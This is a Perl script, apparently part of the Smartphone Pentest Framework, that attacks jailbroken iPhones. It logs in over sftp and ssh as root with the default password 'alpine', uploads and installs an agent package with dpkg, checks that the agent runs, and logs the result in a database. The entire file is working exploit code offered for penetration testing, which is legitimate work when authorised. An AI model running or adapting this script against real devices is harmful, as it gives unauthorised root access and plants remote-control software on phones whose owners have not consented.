#!/usr/bin/perl
use Cwd;
use DBI;
use Expect;
use FindBin qw($Bin);
use lib "$Bin/lib";
use SPF;

my %Variables = SPF::readconfig();
my $dbh = SPF::dbconnect(%Variables);
$Variables{"OS"} = $^O;	
$ipaddress = $ARGV[0];		
			$vulnerable = "no";
			$agent = "no";
			$command = 'sftp';
			$param = "root@" . $ipaddress;
			$timeout = 10;
			$notfound = "ssh: connect to host " . $ipaddress . " port 22: Connection refused";
			$passwordstring = $parm . "'s password: ";
 $location = $Variables{"IPHONEAGENT"};
			$putfile = $location;
			$connectstring = "Connecting to " . $ipaddress . "...";
			
                        $installcommand = "dpkg -i " . "iphone.deb" . "\n";
			$exp = Expect->spawn($command, $param) or die "Cannot spawm sftp command";
			$exp->expect($timeout,[$connectstring]);
			$exp->expect($timeout,["Are you sure you want to continue connecting (yes/no)?", sub {my $self = shift; $self->send("yes\n");}]); #[$notfound, return]);
			$exp->expect($timeout, $passwordstring);
			$exp->send("alpine\n");
			if ($exp->expect($timeout, ["sftp>"]))
			{
				$vulnerable="yes";
			}
			$exp->send("put $putfile\n");
			$exp->expect($timeout, ["sftp>"]);
			$exp->send("bye\n");
			$command2 = "ssh";
			$exp = Expect->spawn($command2, $param);
			 $exp->expect($timeout,["Are you sure you want to continue connecting (yes/no)?", sub {my $self = shift; $self->send("yes\n");}]);
			$exp->expect($timeout, $passwordstring);
                        $exp->send("alpine\n");
			$exp->expect($timeout, [qr'root\s*']); 
			#$installcommand = "dpkg -i  com.bulbsecurity.tooltest_0.0.1-23_iphoneos-arm.deb\n";
			$exp->send($installcommand);
			$exp->expect($timeout, "Setting up com.bulbsecurity.tooltest (0.0.1-23) ...");
			$exp->send("tooltest\n");
			if($exp->expect($timeout,["Smartphone Pentest Framework Agent"]))
			{
				$agent="yes";
			}
			$exp->send("exit");
			$exp->soft_close();
$sql = $dbh->prepare("INSERT INTO remote (id,ip,exploit,vuln,agent) VALUES (DEFAULT,?,?,?,?)");
	$sql->execute($ipaddress,"alpine",$vulnerable,$agent);
